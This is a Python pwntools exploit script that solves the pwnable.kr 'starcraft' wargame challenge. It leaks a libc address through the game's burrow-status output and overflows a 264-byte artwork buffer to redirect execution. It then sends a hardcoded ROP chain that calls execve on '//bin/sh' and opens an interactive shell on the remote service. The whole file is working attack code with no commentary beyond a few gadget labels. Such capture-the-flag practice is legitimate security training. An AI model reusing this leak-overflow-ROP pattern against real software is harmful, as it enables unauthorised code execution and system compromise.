import os
from pwn import *
import argparse
from struct import pack


context.log_level = 'debug'


# ADDR = 'localhost'
ADDR = 'pwnable.kr'
PORT = 9020

# BIN_PATH = '/home/starcraft/starcraft'
# LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6'
BIN_PATH = './starcraft'
LIBC_PATH = './libc-2.23.so'
e = ELF(BIN_PATH)
libc = ELF(LIBC_PATH)


def choose_unit(p):
    p.recvuntil('9. Ultralisk\n')
    p.sendline('6')  # choose templar


def templar_morph(p):
    p.recvuntil('select attack option (0. default, 1. arcon warp, 2. hallucination, 3. psionic strom)')
    p.sendline('1')


def leak_libc_address(p):
    p.recvuntil('select attack option (0. default)')
    p.sendline('2')
    p.recvuntil('is burrowed : ')
    lower_dword = int(p.recvuntil('\n'))
    if lower_dword < 0:
        lower_dword = 0x100000000 + lower_dword
    p.recvuntil('is burrow-able? : ')
    upper_dword = int(p.recvuntil('\n'))
    exit_address = lower_dword + (upper_dword << 32)
    return exit_address - libc.symbols.exit


def acron_attack_for_points(p):
    line = p.recvline()
    while 'you win!' not in line:
        if 'select attack option' in line:
            p.sendline('0')
        line = p.recvline()
        if 'arcon is dead!' in line:
	    raise RuntimeError('Lost!')


def get_passed_stage_12(p):
    current_stage = 1
    progress = log.progress('Stage: ')
    progress.status(str(current_stage))
    while current_stage < 12:
        acron_attack_for_points(p)
        p.recvuntil('Stage ')
        current_stage = int(p.recvuntil(' '))
        progress.status(str(current_stage))


def build_ropchain(libc_address):
    # Based on ropper ropchain
    p = lambda x : pack('Q', x)

    rebase_0 = lambda x : p(x + libc_address)

    rop = ''

    rop += rebase_0(0x000000000003a738) # pop rax; ret;
    rop += '//bin/sh'
    rop += rebase_0(0x000000000002a6aa) # pop rbx; ret;
    rop += rebase_0(0x00000000003c4080)
    rop += rebase_0(0x000000000013836e) # mov qword ptr [rbx], rax; pop rbx; ret;
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000003a738) # pop rax; ret;
    rop += p(0x0000000000000000)
    rop += rebase_0(0x000000000002a6aa) # pop rbx; ret;
    rop += rebase_0(0x00000000003c4088)
    rop += rebase_0(0x000000000013836e) # mov qword ptr [rbx], rax; pop rbx; ret;
    rop += p(0xdeadbeefdeadbeef)

    rop += rebase_0(0x0000000000021112) # pop rdi; ret;
    rop += rebase_0(0x00000000003c4080)
    rop += rebase_0(0x00000000000202f8) # pop rsi; ret;
    rop += rebase_0(0x00000000003c4088)
    rop += rebase_0(0x0000000000001b92) # pop rdx; ret;
    rop += rebase_0(0x00000000003c4088)
    rop += rebase_0(0x000000000003a738) # pop rax; ret;
    rop += p(0x000000000000003b)
    rop += rebase_0(0x00000000000bc3f5) # syscall; ret;

    return rop


def insert_ropchain_in_haystack(p, libc_address):
    acron_attack_for_points(p)
    p.recvuntil('wanna cheat? (yes/no) :')
    p.sendline('yes')
    p.recvuntil('your command :')
    ropchain = build_ropchain(libc_address)
    log.info('ropchain: {}'.format(ropchain))
    p.sendline('A' * 8 + ropchain)


def write_address_of_shell(p, libc_address):
    p.recvuntil('select attack option (0. default)')
    p.sendline('1')
    p.recvuntil('input unit ascii artwork :')

    address_of_shell = libc_address + 0x8E7BE  # ret to stack mod
    p.sendline('A' * 264 + p64(address_of_shell))


def start_process():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['local', 'remote'])
    args = parser.parse_args()

    p = None

    if args.mode == 'local':
        log.info('running locally...')
        p = process(BIN_PATH)
    elif args.mode == 'remote':
        log.info('pwning...')
        p = remote(ADDR, PORT)
    else:
        log.critical('invalid option')
        os.exit(1)
    return p


def main():
    p = start_process()

    choose_unit(p)
    templar_morph(p)
    libc_address = leak_libc_address(p)
    log.info('libc address: 0x{:016x}'.format(libc_address))

    get_passed_stage_12(p)
    write_address_of_shell(p, libc_address)
    insert_ropchain_in_haystack(p, libc_address)
    p.interactive()


if __name__ == '__main__':
    main()

